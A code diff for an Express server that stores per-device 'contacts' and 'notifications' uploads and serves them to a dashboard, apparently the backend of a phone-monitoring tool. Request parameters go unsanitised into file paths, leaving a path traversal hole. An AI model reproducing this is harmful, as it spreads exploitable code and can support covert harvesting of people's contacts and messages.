@@ -51,35 +51,52 @@ app.post('/api/upload_data', (req, res) => {
 
     let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-    // File Name: M2103K19I_contacts.json
     const fileName = `${id}_${type}.json`;
     const filePath = path.join(UPLOADS_DIR, fileName);
 
     try {
-        fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
+        // --- NOTIFICATION APPEND LOGIC ADDED ---
+        let finalData;
+        
+        if (type === 'notifications') {
+            let existingData = [];
+            if (fs.existsSync(filePath)) {
+                try {
+                    const content = fs.readFileSync(filePath, 'utf8');
+                    existingData = JSON.parse(content);
+                    if (!Array.isArray(existingData)) existingData = [existingData];
+                } catch (e) { existingData = []; }
+            }
+            // Naya data list mein sabse upar jodo
+            existingData.unshift(parsedData); 
+            // Max 100 notifications rakhein taaki server crash na ho
+            finalData = existingData.slice(0, 100);
+        } else {
+            // Contacts ya baaki cheezon ke liye purana style (Full Overwrite)
+            finalData = parsedData;
+        }
+
+        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
         res.json({ status: "success" });
     } catch (error) {
+        console.error("Save Error:", error);
         res.status(500).json({ status: "error" });
     }
 });
 
 // ==================================================
-// 💻 DASHBOARD SIDE (FIXED ROUTES)
+// 💻 DASHBOARD SIDE
 // ==================================================
 
-// 🔥 YE MISSING THA: Dashboard isi se data uthayega
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const { device_id, type } = req.params;
-    // Naming pattern match karo: M2103K19I_contacts.json
     const fileName = `${device_id}_${type}.json`;
     const filePath = path.join(UPLOADS_DIR, fileName);
-
-    console.log(`🔍 Dashboard is asking for: ${fileName}`);
 
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
-        res.json([]); // File nahi hai to empty array bhejo
+        res.json([]); 
     }
 });
 
